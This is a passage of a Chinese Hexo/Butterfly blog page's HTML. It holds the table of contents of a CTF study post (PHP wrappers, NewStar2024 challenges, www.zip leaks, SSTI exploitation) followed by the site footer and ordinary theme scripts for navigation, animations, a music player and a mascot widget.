class="toc-item toc-level-4"><a class="toc-link" href="#13-expect"><span class="toc-number">1.1.2.13.</span> <span class="toc-text">13. expect:&#x2F;&#x2F;</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%88newstar2024%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">做题记录（newstar2024）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E9%81%97%E5%A4%B1%E7%9A%84%E6%8B%89%E9%93%BE"><span class="toc-number">1.2.1.</span> <span class="toc-text">题目：遗失的拉链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E4%BD%A0%E8%83%BD%E5%9C%A8%E4%B8%80%E7%A7%92%E5%86%85%E6%89%93%E5%87%BA%E5%85%AB%E5%8F%A5%E8%8B%B1%E6%96%87%E5%90%97"><span class="toc-number">1.2.2.</span> <span class="toc-text">题目：你能在一秒内打出八句英文吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%9A%E5%A4%8D%E8%AF%BB%E6%9C%BA"><span class="toc-number">1.2.3.</span> <span class="toc-text">题目：复读机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.3.</span> <span class="toc-text">题目总结学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#www-zip%E6%B3%84%E9%9C%B2"><span class="toc-number">1.3.1.</span> <span class="toc-text">www.zip泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.2.</span> <span class="toc-text">SSTI漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.3.</span> <span class="toc-text">SSTI注入的利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%8E%A2%E6%B5%8BSSTI%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">1. 探测SSTI漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8SSTI%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">2. 利用SSTI漏洞</span></a></li></ol></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">尘埃尚未落定，一切皆有可能</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer src="/js/light.js"></script><script defer type="text/javascript" src="https://cdn1.tianli0.top/npm/sweetalert2@8.19.0/dist/sweetalert2.all.js"></script><script defer src="/js/lunar.js"></script><script defer src="/js/day.js"></script><script async src="/js/title.js"></script><canvas id="snow"></canvas><script async src="/js/snow.js"></script><div class="aplayer no-destroy" data-id="8773918792" data-server="tencent" data-type="playlist" data-fixed="true" data-autoplay="true"> </div><script src="https://cdn.staticfile.org/jquery/3.6.3/jquery.min.js"></script><script async data-pjax src="https://cdn.wpon.cn/2022-sucai/Gold-ingot.js"></script><script async data-pjax src="/js/newYear.js"></script><script async src="/js/console.js"></script><script src="https://cdn.staticfile.org/jquery/3.6.3/jquery.min.js"></script><script async data-pjax src="/js/txmap.js"></script><script defer src="https://npm.elemecdn.com/jquery@latest/dist/jquery.min.js"></script><script defer data-pjax src="/js/cat.js"></script><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="Misc,Pwn,Web,Reverse,Crypto" data-fontsize="15px" data-random="true" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      pjax.loadUrl('/404.html')
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><!-- hexo injector body_end start --> <script data-pjax>if(document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+    var parent = document.getElementById('recent-posts');
+    var child = '<div class="recent-post-item" style="width:100%;height: auto"><div id="catalog_magnet"><div class="magnet_item"><a class="magnet_link" href="http://czxh.top/categories/CTF/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">📚 CTF 做题经历 (9)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="http://czxh.top/categories/个人/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🎮 个人 (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="http://czxh.top/categories/其他/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🐱‍👓 其他 (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="http://czxh.top/categories/python/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">👩‍💻 python (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="http://czxh.top/categories/unity/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">📒 unity (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="http://czxh.top/categories/学习笔记/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🎨 学习笔记 (4)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><a class="magnet_link_more"  href="http://czxh.top/categories" style="flex:1;text-align: center;margin-bottom: 10px;">查看更多...</a></div></div>';
+    console.log('已挂载magnet')
+    parent.insertAdjacentHTML("afterbegin",child)}
+     </script><style>#catalog_magnet{flex-wrap: wrap;display: flex;width:100%;justify-content:space-between;padding: 10px 10px 0 10px;align-content: flex-start;}.magnet_item{flex-basis: calc(50% - 5px);background: #f2f2f2;margin-bottom: 10px;border-radius: 8px;transition: all 0.2s ease-in-out;}.magnet_item:hover{background: #b30070}.magnet_link_more{color:#555}.magnet_link{color:black}.magnet_link:hover{color:white}@media screen and (max-width: 600px) {.magnet_item {flex-basis: 100%;}}.magnet_link_context{display:flex;padding: 10px;font-size:16px;transition: all 0.2s ease-in-out;}.magnet_link_context:hover{padding: 10px 20px;}</style>
+    <style></style><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '2s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('blog-slider swiper-container-fade swiper-container-horizontal');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('catalog_magnet');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '1.5s·');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '2s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('pagination');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__jackInTheBox');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('article-sort-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__slideInRight');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>
